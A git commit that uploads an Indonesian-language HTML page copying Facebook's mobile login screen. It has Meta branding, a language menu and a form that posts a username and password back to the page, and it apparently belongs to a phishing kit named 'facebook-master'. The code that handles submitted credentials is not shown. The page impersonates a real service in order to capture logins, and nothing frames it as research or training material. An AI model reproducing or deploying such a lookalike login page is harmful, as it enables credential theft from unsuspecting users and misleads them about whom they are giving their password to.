e4d88f12c7df6dc9dcc734f6e2c642dba8bc6849
Debo Kontoru <57215976+MrDebo@users.noreply.github.com>
2023-09-25 20:48:48 +0700

    Add files via upload

---
+++ facebook-master/static/index.php
@@ -0,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="UTF-8">
+  <meta content="width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5" name="viewport" />
+    <title>Masuk Facebook</title>
+    <link href="static/scss/css/style.css" rel="stylesheet">
+  </head>
+  <body>
+    <div class="header">
+      <a href="#">Pasang Facebook untuk Android dan buka lebih cepat.</a>
+    </div>
+    <form action="" method="post">
+      <h2>facebook</h2>
+      <input type="text" name="username" id="username" placeholder="Nomer ponsel atau email">
+      <input type="password" name="password" id="password" placeholder="Kata sandi">
+      <button type="submit" id="submit">Masuk</button>
+      <a href="#">Lupa kata sandi?</a> 
+    </form>
+    <div class="atau">
+      <span></span>
+      <p>atau</p>
+      <span></span>
+    </div>
+    <a href="#" class="buat-akun">Buat akun baru</a>
+    <div class="bahasa">
+      <div class="bahasa-1">
+        <a href="#">Bahasa Indonesia</a>
+        <a href="#">Bahasa Jawa</a>
+        <a href="#">日本語</a>
+        <a href="#">Português (Brasil)</a>
+      </div>
+      <div class="bahasa-2">
+        <a href="#">English (UK)</a>
+        <a href="#">Bahasa Melayu</a>
+        <a href="#">Español</a>
+        <span>+</span>
+      </div> 
+    </div>
+    <div class="meta">Meta © 2023</div>
+  </body>
+</html>
